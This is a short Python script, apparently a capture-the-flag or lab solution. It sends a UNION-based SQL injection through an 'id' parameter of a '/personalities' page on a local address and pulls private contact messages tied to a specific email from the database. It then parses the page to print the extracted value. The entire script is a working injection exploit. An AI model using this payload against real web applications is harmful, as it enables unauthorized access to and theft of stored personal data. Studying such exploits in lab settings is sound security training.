import requests
from bs4 import BeautifulSoup

address = '127.0.01'
#address = '0.0.0.0'
section = '/personalities'
attack = "?id=%' UNION SELECT name, message FROM contact_messages WHERE mail='james@bond.mi5"

r = requests.get('http://' + address + section + attack)

soup = BeautifulSoup(r.text, 'html.parser')
text = soup.find('a', {'class': "list-group-item"}).text
#print(text)

answer = text.split(":")[1]
print(answer)


